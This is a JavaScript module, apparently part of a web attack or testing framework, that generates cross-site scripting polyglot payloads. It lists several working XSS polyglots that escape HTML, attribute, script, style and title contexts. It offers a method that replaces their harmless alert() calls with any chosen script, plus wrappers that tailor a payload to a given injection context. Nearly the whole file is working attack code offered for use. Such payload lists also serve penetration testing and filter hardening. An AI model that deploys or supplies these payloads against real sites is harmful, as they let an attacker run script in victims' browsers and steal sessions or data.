/**
 * @file polyglot-generator.js
 * @description Multi-context polyglot payload generation
 * @version 8.0.0
 */

(function() {
    'use strict';

    class PolyglotGenerator {
        constructor(framework) {
            this.framework = framework;
            this.polyglots = this.initializePolyglots();
        }

        initializePolyglots() {
            return [
                `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e`,
                `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>`,
                `'"><svg/onload=alert(1)>\"<script>alert(1)</script>`,
                `--></script></title></style>"/></script></style></title><script>alert(1)</script>`,
            ];
        }

        generate(callback = 'alert(1)') {
            return this.polyglots.map(p => p.replace(/alert\(['"]?\w+['"]?\)/g, callback));
        }

        createCustomPolyglot(contexts, payload) {
            let polyglot = payload;
            
            contexts.forEach(ctx => {
                polyglot = this.wrapForContext(polyglot, ctx);
            });

            return polyglot;
        }

        wrapForContext(payload, context) {
            const wrappers = {
                html: (p) => `<script>${p}</script>`,
                attribute: (p) => `" ${p} "`,
                javascript: (p) => `'; ${p}; '`,
                css: (p) => `</style>${p}<style>`,
                url: (p) => `javascript:${p}`
            };

            return wrappers[context] ? wrappers[context](payload) : payload;
        }
    }

    // Export
    exports.PolyglotGenerator = PolyglotGenerator;
    exports.create = (framework) => new PolyglotGenerator(framework);
})();